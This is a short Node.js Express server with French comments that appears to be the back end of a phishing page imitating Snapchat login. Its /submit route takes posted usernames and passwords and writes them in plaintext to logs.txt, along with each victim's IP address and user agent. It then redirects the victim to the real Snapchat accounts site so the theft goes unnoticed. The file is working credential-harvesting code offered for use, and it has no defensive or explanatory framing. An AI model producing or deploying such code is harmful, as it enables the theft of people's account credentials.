const express = require('express');
const fs = require('fs');
const path = require('path');

// Créer une instance d'Express
const app = express();
const PORT = 3000;

// Middleware pour parser les données POST
app.use(express.urlencoded({ extended: true }));

// Servir les fichiers statiques (HTML, CSS, images)
app.use(express.static(path.join(__dirname, 'public')));

// Route POST pour traiter les données du formulaire
app.post('/submit', (req, res) => {
  const { username, password } = req.body;

  // Créer une chaîne de données à enregistrer
  const data = `Username: ${username} | Password: ${password} | Date: ${new Date().toISOString()} | IP: ${req.ip} | User-Agent: ${req.headers['user-agent']}\n`;

  // Ajouter les données au fichier logs.txt
  const logFilePath = path.join(__dirname, 'logs.txt');
  fs.appendFile(logFilePath, data, (err) => {
    if (err) {
      console.error('Erreur lors de l\'écriture du fichier :', err);
    }
  });

  // Rediriger l'utilisateur vers Snapchat
  res.redirect('https://accounts.snapchat.com');
});

// Démarrer le serveur
app.listen(PORT, () => {
  console.log(`Serveur en cours d'exécution sur http://localhost:${PORT}`);
});